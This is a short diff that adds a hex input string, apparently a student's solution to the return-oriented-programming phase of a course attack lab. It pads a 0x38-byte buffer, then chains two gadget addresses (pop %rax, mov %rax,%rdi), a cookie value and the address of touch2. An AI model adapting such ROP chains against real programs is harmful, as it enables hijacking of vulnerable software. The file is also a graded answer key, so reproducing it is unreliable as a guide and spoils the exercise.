@@ -1,0 +1,20 @@
+/* Just a buffer the length of 0x38 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+
+/* Gadget 1 has '58 c3' from getval_265 to pop into %rax */
+d4 19 40 00 00 00 00 00
+
+/* Value of cookie */
+25 68 75 54 00 00 00 00
+
+/* Gadget 2 has '48 89 c7' from getval_230 to move %rax into %rdi */
+db 19 40 00 00 00 00 00
+
+/* Address for touch2 */
+6b 18 40 00 00 00 00 00
